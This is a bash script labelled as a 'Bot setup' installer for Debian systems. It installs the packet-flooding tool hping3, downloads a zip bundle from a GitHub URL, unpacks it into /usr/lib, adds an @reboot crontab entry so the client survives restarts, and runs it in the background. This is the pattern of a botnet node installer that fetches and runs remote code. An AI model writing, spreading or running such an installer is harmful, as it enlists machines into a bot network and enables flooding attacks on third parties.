#!/bin/bash

#Bot setup V2 1090 - Deb Version
#Adding startup support for client.
#Making client run forever.

CLIENT_SRC_URL="https://github.com/allf1090/hx2_1090/raw/main/boot.zip"                             #client install bundle.
CLIENT_INSTALL_DIR="/usr/lib/"                                                                      #client install root dir
CLIENT_INSTALL_NAME="boot"                                                                          #client install name
CLIENT_FULL_PATH=$CLIENT_INSTALL_DIR$CLIENT_INSTALL_NAME                                            #client root dir

#define dynamic variables.
CWD=$(pwd)                                                                                          #current working dir
HOSTN=$(hostname)                                                                                   #get hostname
arch=$(uname -m)                                                                                    #get arch

echo "installing dependencies [curl, uznip, hping3]"
#apt-get update
apt-get install epel-release -y
apt-get install hping3 -y
apt-get install unzip -y
apt-get install wget -y

echo "Installing client ..."
wget $CLIENT_SRC_URL > /dev/null 2>&1
#rm -r $CLIENT_FULL_PATH                                                                            #removing current client
unzip -o "${CLIENT_INSTALL_NAME}.zip" -d "${CLIENT_INSTALL_DIR}" 
rm -r "${CLIENT_INSTALL_NAME}.zip"

echo "adding to startup"
#echo new cron into cron file
(crontab -l ; echo "@reboot ${CLIENT_FULL_PATH}/boot") | crontab -
#install new cron file
echo "start up added"

echo "adding permissions to folders"
chmod +x "${CLIENT_FULL_PATH}/boot"
chmod +x "${CLIENT_FULL_PATH}/plugins/"*

echo "starting up the client ..."
"${CLIENT_FULL_PATH}/boot" &
echo "client running in the background"
